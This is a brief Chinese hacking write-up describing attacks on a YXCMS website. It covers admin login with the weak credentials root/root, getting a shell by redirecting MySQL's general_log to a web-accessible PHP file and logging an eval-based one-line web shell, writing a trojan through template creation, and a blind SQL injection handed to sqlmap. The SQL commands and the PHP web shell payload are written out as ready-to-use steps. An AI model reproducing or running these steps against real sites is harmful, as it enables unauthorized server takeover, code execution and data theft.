开启挖洞之路


下载网站备份文件(发现使用的是yxcms)

登入后台

弱口令 高危+1

root/root

发现报错

查看—secure-file-prive 变量配置，当变量值为 NULL 不可读写，且变量只读不可编辑。

show global variables like '%secure%';


开启全局日志Getshell

查询全局日志变量配置

show variables like '%general%';


开启 general_log

SET GLOBAL general_log = ON


将所有查询语句记录到新指定的可访问的文件中

SET GLOBAL general_log_file = 'C:/phpStudy/www/shell2.php'

查询需要写入的木马，让它写入日志

select ‘<?php eval($_POST[Ptteam]); ?>’;


连接木马

上大马Getshell

存储型XSS 高危+1

任意文件读写 高危+1

登入后台后，直接在前台模板创建新的模板，写入一句话木马

在之前下载的网站备份文件中找到木马的地址

连接木马

传大马Getshell

SQL注入 高危+1

后台碎片删除处，拦截删除碎片数据包

碎片存在显示删除成功，不存在返回无结果，可能存在盲注

直接丢sqlmap👉sqlmap使用推荐
